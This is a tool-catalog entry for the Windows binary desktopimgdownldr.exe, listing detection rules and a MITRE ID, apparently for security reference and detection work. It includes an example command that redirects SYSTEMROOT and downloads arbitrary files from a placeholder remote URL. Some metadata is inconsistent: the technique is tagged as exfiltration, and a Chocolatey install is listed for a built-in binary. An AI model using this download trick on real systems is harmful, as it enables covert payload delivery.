---
id: windows-download-desktopimgdownldr
namespace: windows:download:desktopimgdownldr
name: desktopimgdownldr
description: 'Windows binary used to configure lockscreen/desktop image Located at: c:\windows\system32\desktopimgdownldr.exe.'
author: Gal Kristal
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- desktopimgdownldr
parameters: []
features: []
execution:
  template: desktopimgdownldr
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads the file and sets it as the computer's lockscreen (Download arbitrary files from a web server)
  command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
references:
- label: ''
  url: https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
- type: ioc
  description: desktopimgdownldr.exe that creates non-image file
- type: ioc
  description: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
install:
- method: choco
  package_name: desktopimgdownldr
  commands:
  - choco install desktopimgdownldr
---


# desktopimgdownldr

desktopimgdownldr is a Windows LOLBin. Windows binary used to configure lockscreen/desktop image Located at: c:\windows\system32\desktopimgdownldr.exe.
